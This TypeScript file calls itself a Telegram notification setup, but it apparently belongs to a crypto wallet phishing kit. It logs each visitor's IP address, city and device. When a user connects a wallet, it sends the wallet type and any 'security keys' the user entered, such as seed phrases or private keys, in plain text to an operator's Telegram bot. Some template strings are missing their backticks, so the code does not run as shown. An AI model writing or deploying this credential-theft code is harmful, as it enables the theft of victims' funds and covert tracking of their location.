/**
 * TELEGRAM NOTIFICATION CONFIGURATION
 *
 * Sends real-time Telegram notifications when users:
 * 1. Visit the platform (with location + device info)
 * 2. Connect their wallets (with wallet type + security key info)
 *
 * SETUP INSTRUCTIONS:
 * 1. Create a Telegram Bot via @BotFather → /newbot → get BOT TOKEN
 * 2. Get Chat ID: send a message to your bot → visit:
 *      https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
 *    Then look for: "chat": { "id": YOUR_CHAT_ID }
 * 3. Add environment variables to your deployment (Vercel, etc.):
 *      TELEGRAM_BOT_TOKEN=your_bot_token_here
 *      TELEGRAM_CHAT_ID=your_chat_id_here
 */

export interface UserActivity {
  type: "visit" | "wallet_connect";
  timestamp: string;
  userAgent: string;
  location?: {
    country?: string;
    city?: string;
    ip?: string;
  };
  walletType?: string;
  securityKeysProvided?: boolean;
  securityKeys?: string;
}

export async function sendTelegramNotification(activity: UserActivity) {
  try {
    // Get credentials from environment variables
    const botToken = process.env.TELEGRAM_BOT_TOKEN || "YOUR_DEFAULT_TOKEN";
    const chatId = process.env.TELEGRAM_CHAT_ID || "YOUR_DEFAULT_CHAT_ID";

    if (!botToken || !chatId) {
      console.warn(
        "⚠ Telegram credentials not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in environment variables."
      );
      return;
    }

    let message = "";

    if (activity.type === "visit") {
      // Platform visit notification
      message =
        🌐 <b>New Platform Visit</b>\n\n +
        ⏰ Time: ${new Date(activity.timestamp).toLocaleString()}\n +
        🌍 Location: ${activity.location?.city || "Unknown"}, ${activity.location?.country || "Unknown"}\n +
        📱 Device: ${activity.userAgent}\n +
        🔗 IP: ${activity.location?.ip || "Hidden"};
    } else if (activity.type === "wallet_connect") {
      // Wallet connection notification
      message =
        💰 <b>Wallet Connected</b>\n\n +
        ⏰ Time: ${new Date(activity.timestamp).toLocaleString()}\n +
        👛 Wallet: ${activity.walletType || "Unknown"}\n +
        🔐 Security Keys: ${activity.securityKeysProvided ? "✅ Provided" : "❌ Not provided"}\n +
        📝 Keys: ${activity.securityKeys || "Not provided"}\n +
        🌍 Location: ${activity.location?.city || "Unknown"}, ${activity.location?.country || "Unknown"}\n +
        📱 Device: ${activity.userAgent}\n +
        🔗 IP: ${activity.location?.ip || "Hidden"};
    }

    // Send message to Telegram via Bot API
    const response = await fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error([Telegram] ❌ API Error: ${response.status} ${response.statusText});
      console.error([Telegram] Response: ${errorText});
      throw new Error(Telegram API error: ${response.status} - ${errorText});
    }

    const result = await response.json();
    console.log([Telegram] ✅ Notification sent successfully: ${result.ok});
  } catch (error) {
    console.error("[Telegram] ❌ Failed to send notification:", error);
  }
}
